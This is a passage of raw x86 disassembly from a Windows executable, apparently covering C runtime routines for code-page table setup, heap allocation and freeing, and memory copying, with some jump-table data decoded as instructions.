  4240c5:	mov    ebp,esp
  4240c7:	sub    esp,0x518
  4240cd:	mov    eax,ds:0x465660
  4240d2:	xor    eax,DWORD PTR [ebp+0x4]
  4240d5:	push   esi
  4240d6:	mov    DWORD PTR [ebp-0x4],eax
  4240d9:	lea    eax,[ebp-0x18]
  4240dc:	push   eax
  4240dd:	push   DWORD PTR ds:0x466264
  4240e3:	call   DWORD PTR ds:0x4280dc
  4240e9:	cmp    eax,0x1
  4240ec:	mov    esi,0x100
  4240f1:	jne    0x424204
  4240f7:	xor    eax,eax
  4240f9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424100:	inc    eax
  424101:	cmp    eax,esi
  424103:	jb     0x4240f9
  424105:	mov    al,BYTE PTR [ebp-0x12]
  424108:	test   al,al
  42410a:	mov    BYTE PTR [ebp-0x118],0x20
  424111:	je     0x424149
  424113:	push   ebx
  424114:	lea    edx,[ebp-0x11]
  424117:	push   edi
  424118:	movzx  ecx,BYTE PTR [edx]
  42411b:	movzx  eax,al
  42411e:	cmp    eax,ecx
  424120:	ja     0x42413f
  424122:	sub    ecx,eax
  424124:	inc    ecx
  424125:	mov    ebx,ecx
  424127:	shr    ecx,0x2
  42412a:	lea    edi,[ebp+eax*1-0x118]
  424131:	mov    eax,0x20202020
  424136:	rep stos DWORD PTR es:[edi],eax
  424138:	mov    ecx,ebx
  42413a:	and    ecx,0x3
  42413d:	rep stos BYTE PTR es:[edi],al
  42413f:	inc    edx
  424140:	mov    al,BYTE PTR [edx]
  424142:	inc    edx
  424143:	test   al,al
  424145:	jne    0x424118
  424147:	pop    edi
  424148:	pop    ebx
  424149:	push   0x0
  42414b:	push   DWORD PTR ds:0x466154
  424151:	lea    eax,[ebp-0x518]
  424157:	push   DWORD PTR ds:0x466264
  42415d:	push   eax
  42415e:	push   esi
  42415f:	lea    eax,[ebp-0x118]
  424165:	push   eax
  424166:	push   0x1
  424168:	call   0x426078
  42416d:	push   0x0
  42416f:	push   DWORD PTR ds:0x466264
  424175:	lea    eax,[ebp-0x218]
  42417b:	push   esi
  42417c:	push   eax
  42417d:	push   esi
  42417e:	lea    eax,[ebp-0x118]
  424184:	push   eax
  424185:	push   esi
  424186:	push   DWORD PTR ds:0x466154
  42418c:	call   0x425cbc
  424191:	push   0x0
  424193:	push   DWORD PTR ds:0x466264
  424199:	lea    eax,[ebp-0x318]
  42419f:	push   esi
  4241a0:	push   eax
  4241a1:	push   esi
  4241a2:	lea    eax,[ebp-0x118]
  4241a8:	push   eax
  4241a9:	push   0x200
  4241ae:	push   DWORD PTR ds:0x466154
  4241b4:	call   0x425cbc
  4241b9:	add    esp,0x5c
  4241bc:	xor    eax,eax
  4241be:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241c6:	test   cl,0x1
  4241c9:	je     0x4241e1
  4241cb:	or     BYTE PTR [eax+0x466161],0x10
  4241d2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241d9:	mov    BYTE PTR [eax+0x466280],cl
  4241df:	jmp    0x4241fd
  4241e1:	test   cl,0x2
  4241e4:	je     0x4241f6
  4241e6:	or     BYTE PTR [eax+0x466161],0x20
  4241ed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241f4:	jmp    0x4241d9
  4241f6:	and    BYTE PTR [eax+0x466280],0x0
  4241fd:	inc    eax
  4241fe:	cmp    eax,esi
  424200:	jb     0x4241be
  424202:	jmp    0x424248
  424204:	xor    eax,eax
  424206:	cmp    eax,0x41
  424209:	jb     0x424224
  42420b:	cmp    eax,0x5a
  42420e:	ja     0x424224
  424210:	or     BYTE PTR [eax+0x466161],0x10
  424217:	mov    cl,al
  424219:	add    cl,0x20
  42421c:	mov    BYTE PTR [eax+0x466280],cl
  424222:	jmp    0x424243
  424224:	cmp    eax,0x61
  424227:	jb     0x42423c
  424229:	cmp    eax,0x7a
  42422c:	ja     0x42423c
  42422e:	or     BYTE PTR [eax+0x466161],0x20
  424235:	mov    cl,al
  424237:	sub    cl,0x20
  42423a:	jmp    0x42421c
  42423c:	and    BYTE PTR [eax+0x466280],0x0
  424243:	inc    eax
  424244:	cmp    eax,esi
  424246:	jb     0x424206
  424248:	mov    ecx,DWORD PTR [ebp-0x4]
  42424b:	xor    ecx,DWORD PTR [ebp+0x4]
  42424e:	pop    esi
  42424f:	call   0x42401c
  424254:	leave  
  424255:	ret    
  424256:	push   ebp
  424257:	mov    ebp,esp
  424259:	sub    esp,0x1c
  42425c:	mov    eax,ds:0x465660
  424261:	xor    eax,DWORD PTR [ebp+0x4]
  424264:	push   ebx
  424265:	push   esi
  424266:	mov    esi,DWORD PTR [ebp+0x8]
  424269:	xor    ebx,ebx
  42426b:	cmp    esi,ebx
  42426d:	mov    DWORD PTR [ebp-0x4],eax
  424270:	push   edi
  424271:	je     0x4243cb
  424277:	xor    edx,edx
  424279:	xor    eax,eax
  42427b:	cmp    DWORD PTR [eax+0x465670],esi
  424281:	je     0x4242e8
  424283:	add    eax,0x30
  424286:	inc    edx
  424287:	cmp    eax,0xf0
  42428c:	jb     0x42427b
  42428e:	lea    eax,[ebp-0x1c]
  424291:	push   eax
  424292:	push   esi
  424293:	call   DWORD PTR ds:0x4280dc
  424299:	cmp    eax,0x1
  42429c:	jne    0x4243c3
  4242a2:	push   0x40
  4242a4:	xor    eax,eax
  4242a6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4242aa:	pop    ecx
  4242ab:	mov    edi,0x466160
  4242b0:	rep stos DWORD PTR es:[edi],eax
  4242b2:	stos   BYTE PTR es:[edi],al
  4242b3:	mov    DWORD PTR ds:0x466264,esi
  4242b9:	mov    DWORD PTR ds:0x466154,ebx
  4242bf:	jbe    0x4243b1
  4242c5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242c9:	je     0x424389
  4242cf:	lea    ecx,[ebp-0x15]
  4242d2:	mov    dl,BYTE PTR [ecx]
  4242d4:	test   dl,dl
  4242d6:	je     0x424389
  4242dc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242e0:	movzx  edx,dl
  4242e3:	jmp    0x424379
  4242e8:	push   0x40
  4242ea:	xor    eax,eax
  4242ec:	pop    ecx
  4242ed:	mov    edi,0x466160
  4242f2:	rep stos DWORD PTR es:[edi],eax
  4242f4:	lea    ecx,[edx+edx*2]
  4242f7:	shl    ecx,0x4
  4242fa:	mov    DWORD PTR [ebp-0x8],ebx
  4242fd:	stos   BYTE PTR es:[edi],al
  4242fe:	lea    ebx,[ecx+0x465680]
  424304:	mov    al,BYTE PTR [ebx]
  424306:	mov    esi,ebx
  424308:	jmp    0x424333
  42430a:	mov    dl,BYTE PTR [esi+0x1]
  42430d:	test   dl,dl
  42430f:	je     0x424337
  424311:	movzx  eax,al
  424314:	movzx  edi,dl
  424317:	cmp    eax,edi
  424319:	ja     0x42432f
  42431b:	mov    edx,DWORD PTR [ebp-0x8]
  42431e:	mov    dl,BYTE PTR [edx+0x465668]
  424324:	or     BYTE PTR [eax+0x466161],dl
  42432a:	inc    eax
  42432b:	cmp    eax,edi
  42432d:	jbe    0x424324
  42432f:	inc    esi
  424330:	inc    esi
  424331:	mov    al,BYTE PTR [esi]
  424333:	test   al,al
  424335:	jne    0x42430a
  424337:	inc    DWORD PTR [ebp-0x8]
  42433a:	add    ebx,0x8
  42433d:	cmp    DWORD PTR [ebp-0x8],0x4
  424341:	jb     0x424304
  424343:	mov    eax,DWORD PTR [ebp+0x8]
  424346:	mov    ds:0x466264,eax
  42434b:	mov    DWORD PTR ds:0x46615c,0x1
  424355:	call   0x42406c
  42435a:	lea    ecx,[ecx+0x465674]
  424360:	mov    esi,ecx
  424362:	mov    edi,0x466270
  424367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424369:	mov    ds:0x466154,eax
  42436e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42436f:	jmp    0x4243d0
  424371:	or     BYTE PTR [eax+0x466161],0x4
  424378:	inc    eax
  424379:	cmp    eax,edx
  42437b:	jbe    0x424371
  42437d:	inc    ecx
  42437e:	inc    ecx
  42437f:	cmp    BYTE PTR [ecx-0x1],0x0
  424383:	jne    0x4242d2
  424389:	xor    ecx,ecx
  42438b:	inc    ecx
  42438c:	mov    eax,ecx
  42438e:	or     BYTE PTR [eax+0x466161],0x8
  424395:	inc    eax
  424396:	cmp    eax,0xff
  42439b:	jb     0x42438e
  42439d:	mov    eax,esi
  42439f:	call   0x42406c
  4243a4:	mov    ds:0x466154,eax
  4243a9:	mov    DWORD PTR ds:0x46615c,ecx
  4243af:	jmp    0x4243b7
  4243b1:	mov    DWORD PTR ds:0x46615c,ebx
  4243b7:	xor    eax,eax
  4243b9:	mov    edi,0x466270
  4243be:	stos   DWORD PTR es:[edi],eax
  4243bf:	stos   DWORD PTR es:[edi],eax
  4243c0:	stos   DWORD PTR es:[edi],eax
  4243c1:	jmp    0x4243d0
  4243c3:	cmp    DWORD PTR ds:0x465fc4,ebx
  4243c9:	je     0x4243d9
  4243cb:	call   0x42409b
  4243d0:	call   0x4240c4
  4243d5:	xor    eax,eax
  4243d7:	jmp    0x4243dc
  4243d9:	or     eax,0xffffffff
  4243dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243df:	xor    ecx,DWORD PTR [ebp+0x4]
  4243e2:	pop    edi
  4243e3:	pop    esi
  4243e4:	pop    ebx
  4243e5:	call   0x42401c
  4243ea:	leave  
  4243eb:	ret    
  4243ec:	push   0x14
  4243ee:	push   0x4285a0
  4243f3:	call   0x423950
  4243f8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243fc:	push   0xd
  4243fe:	call   0x423b0f
  424403:	pop    ecx
  424404:	xor    edi,edi
  424406:	mov    DWORD PTR [ebp-0x4],edi
  424409:	mov    DWORD PTR ds:0x465fc4,edi
  42440f:	mov    eax,DWORD PTR [ebp+0x8]
  424412:	cmp    eax,0xfffffffe
  424415:	jne    0x424429
  424417:	mov    DWORD PTR ds:0x465fc4,0x1
  424421:	call   DWORD PTR ds:0x4280d8
  424427:	jmp    0x424454
  424429:	cmp    eax,0xfffffffd
  42442c:	jne    0x424440
  42442e:	mov    DWORD PTR ds:0x465fc4,0x1
  424438:	call   DWORD PTR ds:0x4280d4
  42443e:	jmp    0x424454
  424440:	cmp    eax,0xfffffffc
  424443:	jne    0x424454
  424445:	mov    DWORD PTR ds:0x465fc4,0x1
  42444f:	mov    eax,ds:0x465ff4
  424454:	mov    DWORD PTR [ebp+0x8],eax
  424457:	cmp    eax,DWORD PTR ds:0x466264
  42445d:	je     0x42451e
  424463:	mov    esi,DWORD PTR ds:0x466158
  424469:	mov    DWORD PTR [ebp-0x20],esi
  42446c:	cmp    esi,edi
  42446e:	je     0x424474
  424470:	cmp    DWORD PTR [esi],edi
  424472:	je     0x424484
  424474:	push   0x220
  424479:	call   0x424672
  42447e:	pop    ecx
  42447f:	mov    esi,eax
  424481:	mov    DWORD PTR [ebp-0x20],esi
  424484:	cmp    esi,edi
  424486:	je     0x424507
  424488:	push   DWORD PTR [ebp+0x8]
  42448b:	call   0x424256
  424490:	pop    ecx
  424491:	mov    DWORD PTR [ebp-0x1c],eax
  424494:	cmp    eax,edi
  424496:	jne    0x424507
  424498:	mov    DWORD PTR [esi],edi
  42449a:	mov    eax,ds:0x466264
  42449f:	mov    DWORD PTR [esi+0x4],eax
  4244a2:	mov    eax,ds:0x46615c
  4244a7:	mov    DWORD PTR [esi+0x8],eax
  4244aa:	mov    eax,ds:0x466154
  4244af:	mov    DWORD PTR [esi+0xc],eax
  4244b2:	xor    eax,eax
  4244b4:	mov    DWORD PTR [ebp-0x24],eax
  4244b7:	cmp    eax,0x5
  4244ba:	jge    0x4244cc
  4244bc:	mov    cx,WORD PTR [eax*2+0x466270]
  4244c4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244c9:	inc    eax
  4244ca:	jmp    0x4244b4
  4244cc:	xor    eax,eax
  4244ce:	mov    DWORD PTR [ebp-0x24],eax
  4244d1:	cmp    eax,0x101
  4244d6:	jge    0x4244e5
  4244d8:	mov    cl,BYTE PTR [eax+0x466160]
  4244de:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244e2:	inc    eax
  4244e3:	jmp    0x4244ce
  4244e5:	xor    eax,eax
  4244e7:	mov    DWORD PTR [ebp-0x24],eax
  4244ea:	cmp    eax,0x100
  4244ef:	jge    0x424501
  4244f1:	mov    cl,BYTE PTR [eax+0x466280]
  4244f7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244fe:	inc    eax
  4244ff:	jmp    0x4244e7
  424501:	mov    DWORD PTR ds:0x466158,esi
  424507:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42450b:	jne    0x424521
  42450d:	cmp    esi,DWORD PTR ds:0x466158
  424513:	je     0x424521
  424515:	push   esi
  424516:	call   0x42455a
  42451b:	pop    ecx
  42451c:	jmp    0x424521
  42451e:	mov    DWORD PTR [ebp-0x1c],edi
  424521:	or     DWORD PTR [ebp-0x4],0xffffffff
  424525:	call   0x424533
  42452a:	mov    eax,DWORD PTR [ebp-0x1c]
  42452d:	call   0x42398b
  424532:	ret    
  424533:	push   0xd
  424535:	call   0x423a7b
  42453a:	pop    ecx
  42453b:	ret    
  42453c:	cmp    DWORD PTR ds:0x4664ac,0x0
  424543:	jne    0x424557
  424545:	push   0xfffffffd
  424547:	call   0x4243ec
  42454c:	pop    ecx
  42454d:	mov    DWORD PTR ds:0x4664ac,0x1
  424557:	xor    eax,eax
  424559:	ret    
  42455a:	push   0xc
  42455c:	push   0x4285b0
  424561:	call   0x423950
  424566:	mov    esi,DWORD PTR [ebp+0x8]
  424569:	test   esi,esi
  42456b:	je     0x4245c5
  42456d:	cmp    DWORD PTR ds:0x466384,0x3
  424574:	jne    0x4245b6
  424576:	push   0x4
  424578:	call   0x423b0f
  42457d:	pop    ecx
  42457e:	and    DWORD PTR [ebp-0x4],0x0
  424582:	push   esi
  424583:	call   0x424d32
  424588:	pop    ecx
  424589:	mov    DWORD PTR [ebp-0x1c],eax
  42458c:	test   eax,eax
  42458e:	je     0x424599
  424590:	push   esi
  424591:	push   eax
  424592:	call   0x424d5d
  424597:	pop    ecx
  424598:	pop    ecx
  424599:	or     DWORD PTR [ebp-0x4],0xffffffff
  42459d:	call   0x4245ad
  4245a2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4245a6:	jne    0x4245c5
  4245a8:	push   DWORD PTR [ebp+0x8]
  4245ab:	jmp    0x4245b7
  4245ad:	push   0x4
  4245af:	call   0x423a7b
  4245b4:	pop    ecx
  4245b5:	ret    
  4245b6:	push   esi
  4245b7:	push   0x0
  4245b9:	push   DWORD PTR ds:0x466380
  4245bf:	call   DWORD PTR ds:0x4280c4
  4245c5:	call   0x42398b
  4245ca:	ret    
  4245cb:	push   0xc
  4245cd:	push   0x4285c0
  4245d2:	call   0x423950
  4245d7:	mov    esi,DWORD PTR [ebp+0x8]
  4245da:	cmp    DWORD PTR ds:0x466384,0x3
  4245e1:	jne    0x424611
  4245e3:	cmp    esi,DWORD PTR ds:0x466144
  4245e9:	ja     0x424611
  4245eb:	push   0x4
  4245ed:	call   0x423b0f
  4245f2:	pop    ecx
  4245f3:	and    DWORD PTR [ebp-0x4],0x0
  4245f7:	push   esi
  4245f8:	call   0x425511
  4245fd:	pop    ecx
  4245fe:	mov    DWORD PTR [ebp-0x1c],eax
  424601:	or     DWORD PTR [ebp-0x4],0xffffffff
  424605:	call   0x42463d
  42460a:	mov    eax,DWORD PTR [ebp-0x1c]
  42460d:	test   eax,eax
  42460f:	jne    0x424634
  424611:	test   esi,esi
  424613:	jne    0x424616
  424615:	inc    esi
  424616:	cmp    DWORD PTR ds:0x466384,0x1
  42461d:	je     0x424625
  42461f:	add    esi,0xf
  424622:	and    esi,0xfffffff0
  424625:	push   esi
  424626:	push   0x0
  424628:	push   DWORD PTR ds:0x466380
  42462e:	call   DWORD PTR ds:0x428030
  424634:	call   0x42398b
  424639:	ret    
  42463a:	mov    esi,DWORD PTR [ebp+0x8]
  42463d:	push   0x4
  42463f:	call   0x423a7b
  424644:	pop    ecx
  424645:	ret    
  424646:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42464b:	ja     0x42466f
  42464d:	push   DWORD PTR [esp+0x4]
  424651:	call   0x4245cb
  424656:	test   eax,eax
  424658:	pop    ecx
  424659:	jne    0x424671
  42465b:	cmp    DWORD PTR [esp+0x8],eax
  42465f:	je     0x424671
  424661:	push   DWORD PTR [esp+0x4]
  424665:	call   0x426232
  42466a:	test   eax,eax
  42466c:	pop    ecx
  42466d:	jne    0x42464d
  42466f:	xor    eax,eax
  424671:	ret    
  424672:	push   DWORD PTR ds:0x466008
  424678:	push   DWORD PTR [esp+0x8]
  42467c:	call   0x424646
  424681:	pop    ecx
  424682:	pop    ecx
  424683:	ret    
  424684:	int3   
  424685:	int3   
  424686:	int3   
  424687:	int3   
  424688:	int3   
  424689:	int3   
  42468a:	int3   
  42468b:	int3   
  42468c:	int3   
  42468d:	int3   
  42468e:	int3   
  42468f:	int3   
  424690:	push   ebp
  424691:	mov    ebp,esp
  424693:	push   edi
  424694:	push   esi
  424695:	mov    esi,DWORD PTR [ebp+0xc]
  424698:	mov    ecx,DWORD PTR [ebp+0x10]
  42469b:	mov    edi,DWORD PTR [ebp+0x8]
  42469e:	mov    eax,ecx
  4246a0:	mov    edx,ecx
  4246a2:	add    eax,esi
  4246a4:	cmp    edi,esi
  4246a6:	jbe    0x4246b0
  4246a8:	cmp    edi,eax
  4246aa:	jb     0x42482c
  4246b0:	test   edi,0x3
  4246b6:	jne    0x4246cc
  4246b8:	shr    ecx,0x2
  4246bb:	and    edx,0x3
  4246be:	cmp    ecx,0x8
  4246c1:	jb     0x4246ec
  4246c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c5:	jmp    DWORD PTR [edx*4+0x4247dc]
  4246cc:	mov    eax,edi
  4246ce:	mov    edx,0x3
  4246d3:	sub    ecx,0x4
  4246d6:	jb     0x4246e4
  4246d8:	and    eax,0x3
  4246db:	add    ecx,eax
  4246dd:	jmp    DWORD PTR [eax*4+0x4246f0]
  4246e4:	jmp    DWORD PTR [ecx*4+0x4247ec]
  4246eb:	nop
  4246ec:	jmp    DWORD PTR [ecx*4+0x424770]
  4246f3:	nop
  4246f4:	add    BYTE PTR [edi+0x42],al
  4246f7:	add    BYTE PTR [edi+eax*2],ch
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [eax+0x47],dl
  4246fe:	inc    edx
  4246ff:	add    BYTE PTR [ebx],ah
  424701:	ror    DWORD PTR [edx-0x75f877fa],1
  424707:	inc    esi
  424708:	add    DWORD PTR [eax+0x468a0147],ecx
  42470e:	add    al,cl
  424710:	jmp    0x289cf17
  424715:	add    esi,0x3
  424718:	add    edi,0x3
  42471b:	cmp    ecx,0x8
  42471e:	jb     0x4246ec
  424720:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424722:	jmp    DWORD PTR [edx*4+0x4247dc]
  424729:	lea    ecx,[ecx+0x0]
  42472c:	and    edx,ecx
  42472e:	mov    al,BYTE PTR [esi]
  424730:	mov    BYTE PTR [edi],al
  424732:	mov    al,BYTE PTR [esi+0x1]
  424735:	shr    ecx,0x2
  424738:	mov    BYTE PTR [edi+0x1],al
  42473b:	add    esi,0x2
  42473e:	add    edi,0x2
  424741:	cmp    ecx,0x8
  424744:	jb     0x4246ec
  424746:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424748:	jmp    DWORD PTR [edx*4+0x4247dc]
  42474f:	nop
  424750:	and    edx,ecx
  424752:	mov    al,BYTE PTR [esi]
  424754:	mov    BYTE PTR [edi],al
  424756:	add    esi,0x1
  424759:	shr    ecx,0x2
  42475c:	add    edi,0x1
  42475f:	cmp    ecx,0x8
  424762:	jb     0x4246ec
  424764:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424766:	jmp    DWORD PTR [edx*4+0x4247dc]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	rol    DWORD PTR [edi+0x42],cl
  424773:	add    al,al
  424775:	inc    edi
  424776:	inc    edx
  424777:	add    BYTE PTR [eax-0x4fffbdb9],bh
  42477d:	inc    edi
  42477e:	inc    edx
  42477f:	add    BYTE PTR [eax-0x5fffbdb9],ch
  424785:	inc    edi
  424786:	inc    edx
  424787:	add    BYTE PTR [eax-0x6fffbdb9],bl
  42478d:	inc    edi
  42478e:	inc    edx
  42478f:	add    BYTE PTR [ebx-0x761b71bc],cl
  424795:	inc    esp
  424796:	(bad)  
  424797:	in     al,0x8b
  424799:	inc    esp
  42479a:	mov    gs,eax
  42479c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4247a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4247ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4247b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4247b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4247b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4247bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4247c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247c8:	lea    eax,[ecx*4+0x0]
  4247cf:	add    esi,eax
  4247d1:	add    edi,eax
  4247d3:	jmp    DWORD PTR [edx*4+0x4247dc]
  4247da:	mov    edi,edi
  4247dc:	in     al,dx
  4247dd:	inc    edi
  4247de:	inc    edx
  4247df:	add    ah,dh
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],al
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax+ecx*2],dl
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247f1:	leave  
  4247f2:	ret    
  4247f3:	nop
  4247f4:	mov    al,BYTE PTR [esi]
  4247f6:	mov    BYTE PTR [edi],al
  4247f8:	mov    eax,DWORD PTR [ebp+0x8]
  4247fb:	pop    esi
  4247fc:	pop    edi
  4247fd:	leave  
  4247fe:	ret    
  4247ff:	nop
  424800:	mov    al,BYTE PTR [esi]
  424802:	mov    BYTE PTR [edi],al
  424804:	mov    al,BYTE PTR [esi+0x1]
  424807:	mov    BYTE PTR [edi+0x1],al
  42480a:	mov    eax,DWORD PTR [ebp+0x8]
  42480d:	pop    esi
  42480e:	pop    edi
  42480f:	leave  
  424810:	ret    
  424811:	lea    ecx,[ecx+0x0]
  424814:	mov    al,BYTE PTR [esi]
  424816:	mov    BYTE PTR [edi],al
  424818:	mov    al,BYTE PTR [esi+0x1]
  42481b:	mov    BYTE PTR [edi+0x1],al
  42481e:	mov    al,BYTE PTR [esi+0x2]
  424821:	mov    BYTE PTR [edi+0x2],al
  424824:	mov    eax,DWORD PTR [ebp+0x8]
  424827:	pop    esi
  424828:	pop    edi
  424829:	leave  
  42482a:	ret    
  42482b:	nop
  42482c:	lea    esi,[ecx+esi*1-0x4]
  424830:	lea    edi,[ecx+edi*1-0x4]
  424834:	test   edi,0x3
  42483a:	jne    0x424860
  42483c:	shr    ecx,0x2
  42483f:	and    edx,0x3
  424842:	cmp    ecx,0x8
  424845:	jb     0x424854
  424847:	std    
  424848:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42484a:	cld    
  42484b:	jmp    DWORD PTR [edx*4+0x424978]
  424852:	mov    edi,edi
  424854:	neg    ecx
  424856:	jmp    DWORD PTR [ecx*4+0x424928]
  42485d:	lea    ecx,[ecx+0x0]
  424860:	mov    eax,edi
  424862:	mov    edx,0x3
  424867:	cmp    ecx,0x4
  42486a:	jb     0x424878
  42486c:	and    eax,0x3
  42486f:	sub    ecx,eax
  424871:	jmp    DWORD PTR [eax*4+0x42487c]
  424878:	jmp    DWORD PTR [ecx*4+0x424978]
  42487f:	nop
  424880:	mov    WORD PTR [eax+0x42],cs
  424883:	add    BYTE PTR [eax-0x27ffbdb8],dh
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424891:	mov    BYTE PTR [edi+0x3],al
  424894:	sub    esi,0x1
  424897:	shr    ecx,0x2
  42489a:	sub    edi,0x1
  42489d:	cmp    ecx,0x8
  4248a0:	jb     0x424854
  4248a2:	std    
  4248a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248a5:	cld    
  4248a6:	jmp    DWORD PTR [edx*4+0x424978]
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	and    edx,ecx
  4248b5:	mov    BYTE PTR [edi+0x3],al
  4248b8:	mov    al,BYTE PTR [esi+0x2]
  4248bb:	shr    ecx,0x2
  4248be:	mov    BYTE PTR [edi+0x2],al
  4248c1:	sub    esi,0x2
  4248c4:	sub    edi,0x2
  4248c7:	cmp    ecx,0x8
  4248ca:	jb     0x424854
  4248cc:	std    
  4248cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248cf:	cld    
  4248d0:	jmp    DWORD PTR [edx*4+0x424978]
  4248d7:	nop
  4248d8:	mov    al,BYTE PTR [esi+0x3]
  4248db:	and    edx,ecx
  4248dd:	mov    BYTE PTR [edi+0x3],al
  4248e0:	mov    al,BYTE PTR [esi+0x2]
  4248e3:	mov    BYTE PTR [edi+0x2],al
  4248e6:	mov    al,BYTE PTR [esi+0x1]
  4248e9:	shr    ecx,0x2
  4248ec:	mov    BYTE PTR [edi+0x1],al
  4248ef:	sub    esi,0x3
  4248f2:	sub    edi,0x3
  4248f5:	cmp    ecx,0x8
  4248f8:	jb     0x424854
  4248fe:	std    
  4248ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424901:	cld    
  424902:	jmp    DWORD PTR [edx*4+0x424978]
  424909:	lea    ecx,[ecx+0x0]
  42490c:	sub    al,0x49
  42490e:	inc    edx
  42490f:	add    BYTE PTR [ecx+ecx*2],dh
  424912:	inc    edx
  424913:	add    BYTE PTR [ecx+ecx*2],bh
  424916:	inc    edx
  424917:	add    BYTE PTR [ecx+ecx*2+0x42],al
  42491b:	add    BYTE PTR [ecx+ecx*2+0x42],cl
  42491f:	add    BYTE PTR [ecx+ecx*2+0x42],dl
  424923:	add    BYTE PTR [ecx+ecx*2+0x42],bl
  424927:	add    BYTE PTR [edi+0x49],ch
  42492a:	inc    edx
  42492b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424931:	inc    esp
  424932:	(bad)  
  424933:	sbb    al,0x8b
  424935:	inc    esp
  424936:	mov    ds,WORD PTR [eax]
  424938:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424940:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424944:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424948:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42494c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424950:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424954:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424958:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42495c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424960:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424964:	lea    eax,[ecx*4+0x0]
  42496b:	add    esi,eax
  42496d:	add    edi,eax
  42496f:	jmp    DWORD PTR [edx*4+0x424978]
  424976:	mov    edi,edi
  424978:	mov    BYTE PTR [ecx+0x42],cl
  42497b:	add    BYTE PTR [eax-0x5fffbdb7],dl
  424981:	dec    ecx
  424982:	inc    edx
  424983:	add    BYTE PTR [ecx+ecx*2+0x458b0042],dh
  42498a:	or     BYTE PTR [esi+0x5f],bl
  42498d:	leave  
  42498e:	ret    
  42498f:	nop
  424990:	mov    al,BYTE PTR [esi+0x3]
  424993:	mov    BYTE PTR [edi+0x3],al
  424996:	mov    eax,DWORD PTR [ebp+0x8]
  424999:	pop    esi
  42499a:	pop    edi
  42499b:	leave  
  42499c:	ret    
  42499d:	lea    ecx,[ecx+0x0]
  4249a0:	mov    al,BYTE PTR [esi+0x3]
  4249a3:	mov    BYTE PTR [edi+0x3],al
  4249a6:	mov    al,BYTE PTR [esi+0x2]
  4249a9:	mov    BYTE PTR [edi+0x2],al
  4249ac:	mov    eax,DWORD PTR [ebp+0x8]
  4249af:	pop    esi
  4249b0:	pop    edi
  4249b1:	leave  
  4249b2:	ret    
  4249b3:	nop
  4249b4:	mov    al,BYTE PTR [esi+0x3]
  4249b7:	mov    BYTE PTR [edi+0x3],al
  4249ba:	mov    al,BYTE PTR [esi+0x2]
  4249bd:	mov    BYTE PTR [edi+0x2],al
  4249c0:	mov    al,BYTE PTR [esi+0x1]
  4249c3:	mov    BYTE PTR [edi+0x1],al
  4249c6:	mov    eax,DWORD PTR [ebp+0x8]
  4249c9:	pop    esi
  4249ca:	pop    edi
  4249cb:	leave  
  4249cc:	ret    
  4249cd:	push   DWORD PTR [esp+0x4]
  4249d1:	call   DWORD PTR ds:0x4280e0
  4249d7:	xor    eax,eax
  4249d9:	inc    eax
  4249da:	ret    0x8
  4249dd:	push   0x10
  4249df:	push   0x428608
  4249e4:	call   0x423950
  4249e9:	mov    eax,ds:0x465fc8
  4249ee:	test   eax,eax
  4249f0:	jne    0x424a29
